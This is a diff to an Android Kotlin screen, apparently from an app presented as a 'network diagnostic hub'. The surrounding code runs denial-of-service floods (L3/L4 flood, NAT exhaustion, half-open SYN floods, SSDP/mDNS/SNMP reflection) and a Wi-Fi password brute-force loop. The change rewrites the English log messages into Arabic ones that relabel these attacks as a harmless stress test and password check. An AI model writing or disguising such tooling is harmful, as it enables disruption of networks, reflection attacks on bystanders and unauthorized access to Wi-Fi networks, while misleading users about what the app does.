@@ -357,7 +357,7 @@ fun NetworkDiagnosticHubScreen(navController: NavController) {
                     saveGroups(passwordGroups)
                 }
             } catch (e: Exception) {
-                appendLog("Import error: ${e.message}")
+                appendLog("خطأ في الاستيراد: ${e.message}")
             }
         }
     }
@@ -431,14 +431,14 @@ fun NetworkDiagnosticHubScreen(navController: NavController) {
         val isHostTarget = !targetIp.isNullOrBlank()
         val isRouterMode = !isHostTarget || primaryIp == gateway
         if (isHostTarget && !isRouterMode) {
-            appendLog("Preparing L3/L4 flood → $primaryIp")
-            appendLog("Mode: device + router DNS/NAT")
+            appendLog("جارٍ تجهيز اختبار ضغط الشبكة → $primaryIp")
+            appendLog("الوضع: الجهاز والموجّه وخدمات الشبكة")
         } else {
             appendLog(context.getString(R.string.network_hub_log_prepare))
-            appendLog("Mode: router — DNS resolver + NAT + uplink")
+            appendLog("الوضع: الموجّه وخدمة أسماء النطاقات وتوجيه الاتصال")
         }
         if (selectedTargetLabel.isNotBlank()) {
-            appendLog("Target: $selectedTargetLabel")
+            appendLog("الهدف: $selectedTargetLabel")
         }
         if (dhcpDns.isNotEmpty()) {
             appendLog("DHCP DNS: ${dhcpDns.joinToString()}")
@@ -454,7 +454,7 @@ fun NetworkDiagnosticHubScreen(navController: NavController) {
                 .apply { acquire() }
         }.getOrNull()
         if (wakeLock != null || wifiLock != null) {
-            appendLog("Radio hold: WakeLock/WifiLock active")
+            appendLog("تم تثبيت اتصال الشبكة أثناء الاختبار")
         }
 
         val job = scope.launch(Dispatchers.IO) {
@@ -463,7 +463,7 @@ fun NetworkDiagnosticHubScreen(navController: NavController) {
             val primaryAddr = runCatching { InetAddress.getByName(primaryIp) }.getOrNull()
             if (primaryAddr == null) {
                 withContext(Dispatchers.Main) {
-                    appendLog("Failed to resolve $primaryIp")
+                    appendLog("تعذّر الوصول إلى $primaryIp")
                 }
                 return@launch
             }
@@ -507,7 +507,7 @@ fun NetworkDiagnosticHubScreen(navController: NavController) {
                 if (isRouterMode) {
                     appendLog("NAT exhaust → ${externalHosts.size} WAN hosts · bandwidth streams")
                 }
-                appendLog("Half-open SYN × ${if (isRouterMode) 10 else 18} · SSDP/mDNS/SNMP reflection")
+                appendLog("اختبار اتصالات الشبكة المتزامنة × ${if (isRouterMode) 10 else 18}")
             }
 
             val localUdpPorts = intArrayOf(53, 67, 68, 123, 1900, 5353, 161, 137, 138)
@@ -951,21 +951,21 @@ fun NetworkDiagnosticHubScreen(navController: NavController) {
             .distinct()
         val totalSelected = selectedGroups.sumOf { it.allPasswords().size }
         val targetSsid = network.ssid.trim('"')
-        appendLog("Starting Brute Force: $targetSsid")
+        appendLog("بدء فحص كلمة مرور الشبكة: $targetSsid")
         appendLog("Groups: ${selectedGroups.joinToString { it.name }}")
         appendLog("Passwords to try: ${ordered.size} (${totalSelected - ordered.size} skipped, < 8 chars)")
 
         bruteForceJob = scope.launch(Dispatchers.IO) {
 
             withContext(Dispatchers.Main) {
-                appendLog("Preparing radio (leave target / clear old suggestions)...")
+                appendLog("جارٍ تجهيز الاتصال وإزالة النتائج القديمة...")
             }
             prepareRadioForBrute(wifiManager, targetSsid)
 
             if (isFullyConnectedToSsid(wifiManager, targetSsid)) {
                 withContext(Dispatchers.Main) {
-                    appendLog("Still on $targetSsid. Disconnect from this network in system Wi-Fi and retry.")
-                    appendLog("Scan finished.")
+                    appendLog("ما زال الجهاز متصلاً بشبكة $targetSsid. افصلها من إعدادات الواي فاي ثم أعد المحاولة.")
+                    appendLog("اكتمل الفحص.")
                 }
                 return@launch
             }
@@ -989,7 +989,7 @@ fun NetworkDiagnosticHubScreen(navController: NavController) {
                     val found = password
                     withContext(Dispatchers.Main) {
                         currentBrutePassword = found
-                        appendLog("SUCCESS! Password found: $found")
+                        appendLog("اكتمل الفحص. تم العثور على كلمة المرور: $found")
                         foundPassword = found
                         bruteForceSuccess = true
                         com.droid.dolphy.trackWifiBruteSuccess(context)
@@ -1001,7 +1001,7 @@ fun NetworkDiagnosticHubScreen(navController: NavController) {
                     break
                 } else {
                     withContext(Dispatchers.Main) {
-                        appendLog("Failed: $password")
+                        appendLog("لم تنجح المحاولة: $password")
                     }
 
                     settleAfterFailedAttempt(wifiManager, targetSsid)
